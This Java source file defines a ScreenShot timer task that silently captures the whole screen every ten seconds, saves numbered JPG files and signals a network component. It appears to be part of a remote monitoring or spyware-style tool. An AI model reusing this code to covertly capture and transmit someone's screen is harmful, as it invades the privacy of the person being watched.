package application.screenshots;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;

import java.io.File;
import java.io.IOException;

import java.util.Timer;
import java.util.TimerTask;

import javax.imageio.ImageIO;

import application.network.Network;

public class ScreenShot extends TimerTask {
	private int counter = 1;
	
	public ScreenShot() {
		Timer timer = new Timer();
		timer.schedule(this, 0, 10000);	
	}
	
	public void run() {
		try {
            BufferedImage screenFullImage = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ImageIO.write(screenFullImage, "jpg", new File("ScreenShot"+this.counter+".jpg"));
            
            new Network("SCREENSHOT!"+Integer.toString(this.counter));
            this.counter += 1;
        }
		catch (AWTException | IOException ex) {
            System.err.println(ex);
        }
	}
}